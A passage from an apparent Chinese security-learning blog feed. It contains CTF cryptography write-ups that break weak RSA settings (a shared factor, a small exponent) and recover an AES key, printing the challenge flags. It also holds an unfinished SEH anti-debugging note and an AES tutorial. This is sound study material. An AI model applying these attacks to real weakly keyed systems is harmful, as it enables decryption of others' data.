class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br></pre></td></tr></table></figure><p>它用了两个n，尝试莫不互素：gcd一下，出来了最大公倍数，那就直接解了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = GCD(n1,n2)</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line">n1_ = n1 //a</span><br><span class="line">n2_ = n2 // a</span><br><span class="line"><span class="comment"># print(n1_)</span></span><br><span class="line"><span class="comment"># print(n2_)</span></span><br><span class="line"></span><br><span class="line">d1 = <span class="built_in">pow</span>(e,-<span class="number">1</span>,(a-<span class="number">1</span>)*(n2_-<span class="number">1</span>))</span><br><span class="line">c1 = <span class="built_in">pow</span>(c,d1,n2)</span><br><span class="line">d2 = <span class="built_in">pow</span>(e,-<span class="number">1</span>,(a-<span class="number">1</span>)*(n1_-<span class="number">1</span>))</span><br><span class="line">c2 = <span class="built_in">pow</span>(c1,d2,n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c2))</span><br><span class="line"><span class="comment"># b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="bad-e"><a href="#bad-e" class="headerlink" title="bad_e"></a>bad_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p) <span class="comment"># 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line"><span class="built_in">print</span>(q) <span class="comment"># 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br></pre></td></tr></table></figure><p>已知p，q，e，c，直接解</p><p>6,解不出来，说是e是phi的因子，不能得出m，那就分解一下phi</p><p>发现p-1是e的倍数，但是q-1不是，根据同余的消去律可消去两边的最大公因数</p><p>相当于mod((q-1)),就出来了</p><h2 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">p,q = getPrime(<span class="number">2048</span>),getPrime(<span class="number">2048</span>)</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().strip())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c =  147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span></span><br><span class="line"><span class="comment"># n =  553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span></span><br></pre></td></tr></table></figure><p>e很小</p><p>$c &#x3D; m^e + kn$</p><p>$m &#x3D; (c - kn)**(1&#x2F;7)$</p><p>尝试低加密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>]))) <span class="comment">#转为字符串</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line">    <span class="comment"># b&#x27;moectf&#123;SMaLL_3xPon3nt_Mak3_rSa_w3ak!_!lP0iYlJf!M3rux9G9Vf!JoxiMl903lllA&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">flag = <span class="string">b&#x27;19209389120572313&#x27;</span></span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line">key = os.urandom(<span class="number">24</span>)</span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">n=m % key</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#103560843006078708944833658339172896192389513625588</span></span><br><span class="line"><span class="comment">#b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br></pre></td></tr></table></figure><p>通过n &#x3D; m % key来求key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的因子</span></span><br><span class="line">factors = [<span class="number">3</span>,<span class="number">37</span>,<span class="number">439</span>,<span class="number">3939851</span>, <span class="number">265898280367</span>,<span class="number">5036645362649</span>,<span class="number">342291058100503482469327892079792475478873</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的组合</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(factors) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> combinations(factors, r):</span><br><span class="line">        <span class="comment"># 计算可能的 key</span></span><br><span class="line">        possible_key = reduce(<span class="keyword">lambda</span> x, y: x*y, subset)</span><br><span class="line">        <span class="comment"># 检查 key 的长度是否为 24 字节</span></span><br><span class="line">        <span class="comment"># 使用找到的 key、iv 和 enc_flag 解密 flag</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            aes = AES.new(long_to_bytes(possible_key), AES.MODE_CBC, iv)</span><br><span class="line">            flag = aes.decrypt(enc_flag)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Found possible flag:&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">果然还是要以周为单位记录学习啊</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="密码学" scheme="https://www.pri87.vip/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>RE中的反调试</title>
    <link href="https://www.pri87.vip/posts/2af5212f.html"/>
    <id>https://www.pri87.vip/posts/2af5212f.html</id>
    <published>2024-03-17T10:16:30.000Z</published>
    <updated>2024-03-19T11:18:48.771Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>在python中，你是否见过以下语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(factors) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> combinations(factors, r):</span><br><span class="line">        possible_key = reduce(<span class="keyword">lambda</span> x, y: x*y, subset)</span><br><span class="line">        <span class="keyword">try</span>:<span class="comment">#防止key的长度不对</span></span><br><span class="line">            aes = AES.new(long_to_bytes(possible_key), AES.MODE_CBC, iv)</span><br><span class="line">            flag = aes.decrypt(enc_flag)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found possible flag:&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line"><span class="keyword">except</span></span><br></pre></td></tr></table></figure><p>它的作用是尝试执行try块中的内容，如果出现异常，就执行except的内容。</p><p>在Windows中，也有类似的保护程序正常执行的机制，叫做SEH（Structured Exception Handling）</p><p>通过在源代码使用__try,__except,__finally来实现</p><p>使用时，except()中的值用来表示异常处理方法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">__except()括号中表达式的取值范围:</span></span><br><span class="line"><span class="section">1:处理异常</span></span><br><span class="line"><span class="section">0:不处理异常交给下一个异常节点去处理</span></span><br><span class="line"><span class="section">-1:继续执行（程序直接寄掉）</span></span><br></pre></td></tr></table></figure><p>在程序中，可能故意使用SEH，刻意引发错误跳过执行一些指令</p><hr><p>施工中</p>]]></content>
    
    
    <summary type="html">收集反调试！</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
    <category term="动调" scheme="https://www.pri87.vip/tags/%E5%8A%A8%E8%B0%83/"/>
    
  </entry>
  
  <entry>
    <title>加密03:AES</title>
    <link href="https://www.pri87.vip/posts/ca6bad6.html"/>
    <id>https://www.pri87.vip/posts/ca6bad6.html</id>
    <published>2024-03-16T14:29:16.000Z</published>
    <updated>2024-03-19T11:43:27.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Advanced-Encryption-Standard"><a href="#Advanced-Encryption-Standard" class="headerlink" title="Advanced Encryption Standard"></a>Advanced Encryption Standard</h1><p>(高级加密标准)</p><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>对称加密，块加密，流加密<br>密钥长度固定为：128，192，256bit<br>加密模式分为：CBC,CFB,OFB,CTR,GCM,ECB</p><ul><li>对称加密：加密密钥和解密密钥相同</li></ul><blockquote><h2 id="分组密码和流密码"><a href="#分组密码和流密码" class="headerlink" title="分组密码和流密码"></a>分组密码和流密码</h2><p>分组密码是每次只能处理特定长度的一块数据的一类密码算法，这里的“一块”就称为分组。一个分组的比特数就称为分组长度。<br>流密码是对数据流进行连续处理的一类密码算法。流密码一般以1比特、8比特或32比特等为单位进行加密和解密。<br>分组密码算法只能加密固定长度的分组，但需要加密的明文长度可能会超过分组密码的分组长度，这就需要对分组密码算法进行迭代，以便将一段很长的明文全部加密。迭代的方法就被称为分组密码的模式。</p></blockquote><blockquote><ul><li>ECB模式：Electronic CodeBook mode（电子密码本模式）</li><li>CBC模式：Cipher Block Chaining mode（密码分组链接模式）</li><li>CFB模式：Cipher FeedBack mode（密文反馈模式）</li><li>OFB模式：Output FeedBack mode（输出反馈模式）</li><li>CTR模式：CounTeR mode（计数器模式）</li></ul></blockquote><table><thead><tr><th>模式</th><th>名称</th><th>优点</th><th>缺点</th><th>备注</th></tr></thead><tbody><tr><td>ECB模式</td><td>Electronic CodeBook mode（电子密码本模式）</td><td>简单、快速、支持并行运算（加密、解密）</td><td>明文中的重复排列会反映在密文中；通过删除、替换密文分组可以对明文进行操作；对包含某些比特错误的密文进行解密时，对应的分组会出错；不能低于重放攻击。</td><td>不应使用</td></tr><tr><td>CBC模式</td><td>Cipher Block Chaining mode（密码分组链接模式）</td><td>明文的重复排列不会反映在密文中；支持并行计算（仅解密）；能够解密任何密文分组</td><td>对包含某些错误比特的密文进行解密时，第一个分组的全部比特以及后一个分组的相应比特会出错；加密不支持并行计算</td><td>CRYPTREC推荐；《实用密码学》推荐</td></tr><tr><td>CFB模式</td><td>Cipher FeedBack mode（密文反馈模式）</td><td>不需要填充（padding）；支持并行计算（仅解密）；能够解密任意密文分组</td><td>加密不支持并行计算；对包含某些错误比特的密文进行解密时，第一个分组的全部比特以及后一个分组的相应比特会出错；不能低于重放攻击</td><td>CRYPTREC推荐</td></tr><tr><td>OFB模式</td><td>Output FeedBack mode（输出反馈模式）</td><td>不需要填充（padding）；可实现进行加密、解密的准备；解密解密使用相同结构；对包含某些错误比特密文解密时，只有明文中相应的比特会出错</td><td>不支持并行计算；主动攻击者反转密文分组中的某些比特时，明文分组中相应的比特也会被反转</td><td>CRYPTREC推荐</td></tr><tr><td>CTR模式</td><td>CounTeR mode（计数器模式）</td><td>不需要填充（padding）；可实现进行加密、解密的准备；解密解密使用相同结构；对包含某些错误比特密文解密时，只有明文中相应的比特会出错；支持并行计算（加密、解密)</td><td>主动攻击者反转密文分组中的某些比特时，明文分组中相应的比特也会被反转</td><td>CRYPTREC推荐；《实用密码学》推荐</td></tr></tbody></table><p>以上内容来自(<a href="https://blog.csdn.net/weixin_43946212/article/details/108116251">分组密码的模式——ECB、CBC、CFB、OFB、CTR_ofb是指分组密码的哪种工作模式-CSDN博客</a>)</p><hr><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="明文分块"><a href="#明文分块" class="headerlink" title="明文分块"></a>明文分块</h3><p>把所有明文分为n块，每块128bit。如果最后不足，需要填充：</p><ul><li><code>NoPadding</code>： 不做任何填充，但是要求明文必须是16字节的整数倍。<br><code>PKCS5Padding</code>（默认）： 如果明文块少于16个字节（<code>128bit</code>），在明文块末尾补足相应数量的字符，且每个字节的值等于缺少的字符数。 比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 }<br><code>ISO10126Padding</code>：如果明文块少于16个字节（<code>128bit</code>），在明文块末尾补足相应数量的字节，最后一个字符值等于缺少的字符数，其他字符填充随机数。比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}<br><code>PKCS7Padding</code>原理与<code>PKCS5Padding</code>相似，区别是<code>PKCS5Padding</code>的<code>blocksize</code>为8字节，而<code>PKCS7Padding</code>的<code>blocksize</code>可以为1到255字节</li><li>需要注意的是，如果在<code>AES</code>加密的时候使用了某一种填充方式，解密的时候也必须采用同样的填充方式。</li></ul><p>然后每一块按序排列成4x4矩阵</p><h3 id="S盒生成"><a href="#S盒生成" class="headerlink" title="S盒生成"></a>S盒生成</h3><p><img src="https://pic1.zhimg.com/80/v2-9c648584654f34c8eaddf0f57dde2ec3_1440w.webp?source=1def8aca" alt="img"></p><p>这个表是S盒，生成方法如下：</p><ol><li>对S盒初始化为00，01，02，03，…，FE，FF</li><li>用每一格的乘法逆元代替这一格，域是$GF(2^8)$</li><li>对每一格的bit位进行运算，令$b_i^，&#x3D;b_i\oplus b_{i+4 mod 8}\oplus b_{i+5 mod 8}\oplus b_{i+6 mod 8}\oplus b_{i+7 mod 8}\oplus c_i$，其中$c &#x3D; {01100011}$</li></ol><p>逆S盒：用于解密</p><h3 id="字节替代"><a href="#字节替代" class="headerlink" title="字节替代"></a>字节替代</h3><p>通过每一字节前4位和后四位分别作为S盒的行标和列标，替换为对应位置的值</p><h3 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h3><p>把上面已经分为4x4的矩阵中，第i行左移i位</p><h3 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h3><p>最矩阵经行矩阵乘法：<br>$$<br>\begin{bmatrix}<br>   2 &amp; 3 &amp; 1 &amp; 1 \\<br>   1 &amp; 2 &amp; 3 &amp; 1 \\<br>   1 &amp; 1 &amp; 2 &amp; 3 \\<br>   3 &amp; 1 &amp; 1 &amp; 2<br>  \end{bmatrix} \tag{1}<br>  *<br>  before &#x3D; after<br>$$</p><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>每一轮输入与轮密钥进行异或，该项一定出现在加密的首尾，保证安全性</p><p>轮密钥的生成是初始密钥和该轮子密钥异或的结果</p><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p>密钥扩展用于生成子密钥</p><p>现在假设已经有初始密钥的4x4矩阵</p><p>对它分列（以列为单位分成4个）为$W_0，W_1,W_2,W_3$。那么扩展密钥就是扩展出$W_4，W_5,W_6……$</p><p>具体公式是：<br>$$<br>\begin{equation}<br>\left{<br>\begin{aligned}<br>W_i &amp; &#x3D; W_{i-4} \oplus W_{i-1} \\<br>W_i &amp; &#x3D; W_{i-4} \oplus T({W_{i-1}})<br>\end{aligned}<br>\right.<br>\end{equation}<br>$$<br>其中T是函数其作用是：</p><ol><li>假设输入的是$W_i$</li><li>对这一列循环左移一位（列移位），对于$W_i$这一列，就是上移一位</li><li>用S盒对2之后的$W_i$进行字节替代，规则同加密的字节替代</li><li>与给定的矩阵进行异或，矩阵是[RC[j],0,0,0]轮常量是RC &#x3D; {01, 02, 04, 08, 10, 20, 40, 80, 1B, 36}.j是该轮轮数</li></ol><p>然后每4列作为一组成为轮密钥</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><blockquote><p><strong>1）为什么需要密钥扩展：</strong></p><p>不论密钥长度为多少，我们的明文分组始终为16字节（4字）。上文提到，在轮密钥加部分，我们需要为每一轮提供一个长度为4字的轮密钥。</p><p>对于AES-128（4字密钥），需要迭代10轮，加上第0轮，共需要进行11次轮密钥加，而每一次轮密钥加都需要一个长度为4字的轮密钥，因此所需要的扩展密钥长度为 次字字11次×4字&#x3D;44字 。</p><p>对于AES-192（6字密钥），需要迭代12轮，加上第0轮，共需要进行13次轮密钥加，所需要的扩展密钥长度为 次字字13次×4字&#x3D;52字 。</p><p>对于AES-256（8字密钥），需要迭代14轮，加上第0轮，共需要进行15次轮密钥加，所需要的扩展密钥长度为 次字字15次×4字&#x3D;60字 。</p><p>因此我们需要一定的方法用来将密钥扩展到一定的长度。</p></blockquote><blockquote><p><strong>（2）AES-192的密钥扩展方法：</strong></p><p>AES-192的密钥有6个字，其密钥扩展方法与AES-128完全类似。第一个for循环的填充变成了6个字；之后的判断整除条件变为了能否整除6。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只是伪代码，不能运行</span></span><br><span class="line"><span class="title function_">KeyExpansion</span>(<span class="type">byte</span> <span class="built_in">key</span>[<span class="number">24</span>], word w[<span class="number">52</span>])</span><br><span class="line">&#123;</span><br><span class="line">    word temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)<span class="comment">//第一个for循环，填充w的前6个字</span></span><br><span class="line">        w[i] = &#123;<span class="built_in">key</span>[<span class="number">4</span>*i], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">1</span>], </span><br><span class="line">                <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">2</span>], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">3</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">52</span>; i++)<span class="comment">//第二个for循环，填充后面的内容</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = w[i<span class="number">-1</span>];<span class="comment">//保存上一个字</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">6</span> == <span class="number">0</span>)<span class="comment">//如果整除6</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (<span class="title function_">RotWord</span> (temp))</span><br><span class="line">                    xor Rcon[i/<span class="number">6</span>];<span class="comment">//对保存的上一个字进行复杂的处理</span></span><br><span class="line">        w[i] = w[i<span class="number">-6</span>] xor temp;<span class="comment">/*将上一个字（处理或没处理过）</span></span><br><span class="line"><span class="comment">                               与6个字之前的字进行异或，得到当前的字*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>（3）AES-256的密钥扩展方法：</strong></p><p>AES-256的密钥长度为8字。其密钥扩展与AES-128也基本相同，只是修改了填充的字数，值得注意的是：AES-256在第二个for循环里添加了判断条件，当i%&#x3D;&#x3D;4时，要对temp进行一次字代替。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只是伪代码，不能运行</span></span><br><span class="line"><span class="title function_">KeyExpansion</span>(<span class="type">byte</span> <span class="built_in">key</span>[<span class="number">32</span>], word w[<span class="number">60</span>])</span><br><span class="line">&#123;</span><br><span class="line">    word temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)<span class="comment">//第一个for循环，填充w的前8个字</span></span><br><span class="line">        w[i] = &#123;<span class="built_in">key</span>[<span class="number">4</span>*i], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">1</span>], </span><br><span class="line">                <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">2</span>], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">3</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">8</span>; i &lt; <span class="number">60</span>; i++)<span class="comment">//第二个for循环，填充后面的内容</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = w[i<span class="number">-1</span>];<span class="comment">//保存上一个字</span></span><br><span class="line">        <span class="keyword">if</span> 